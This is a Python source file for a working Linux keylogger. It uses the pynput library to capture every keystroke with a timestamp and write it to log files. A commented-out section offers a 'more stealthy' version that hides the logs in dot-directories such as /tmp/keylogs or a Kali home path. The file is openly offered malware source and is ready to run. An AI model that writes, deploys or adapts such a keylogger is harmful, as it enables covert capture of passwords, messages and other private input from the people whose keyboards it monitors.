#!/usr/bin/python

"""
This is a simple keylogger that logs all keystrokes and saves them to a custom directory of your choice.

Note:It is designed to be used on Linux systems.
     It is not designed to be used on Windows systems.
     It is not designed to be used on MacOS systems.
     It is not designed to be used on Android systems.
     It is not designed to be used on iOS systems.
     It is not designed to be used on any other system.
"""


import logging
from pynput import keyboard
import os
from datetime import datetime

# SETUP: Create logs/ folder in CWD
log_dir = os.path.join(os.getcwd(), "logs")
os.makedirs(log_dir, exist_ok=True)

# Generate log file (Timestamped)
timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
log_file = os.path.join(log_dir, f"log_{timestamp}.txt")

print(f"[+] Logging to: {log_file}")  #dbg print for confirmation

# Keystroke Handler v1
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{datetime.now()} - {key.char}\n")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"{datetime.now()} - {key}\n")

"""
#For more advanced stealth activities uncomment this block and remove the Keystroke Handler v1 code block

# Config
log_dir = "/home/kali/kylgr/.keylogs"  # or "/tmp/keylogs" or "~/.keylogs" for root
os.makedirs(log_dir, exist_ok=True)
log_file = os.path.join(log_dir, f"log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")

print(f"[+] Logging to: {log_file}")  # opt dbg

# logging setup
logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format="%(asctime)s - %(message)s"
)

# Keystroke Handler v2 (more stealthy)
#def on_press(key):
#    try:
#        print(f"key: {key.char}")  # dbg print
#        logging.info(f"Key: {key.char}")
#    except:
#        print(f"Special Key: {key}") # dbg print
#        logging.info(f"Special Key: {key}")
#
"""

# Start Listener
def run():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# driver code
if __name__ == "__main__":
    try:
        run()
    except KeyboardInterrupt:
        print("\n[+] Keylogger stopped by user.")
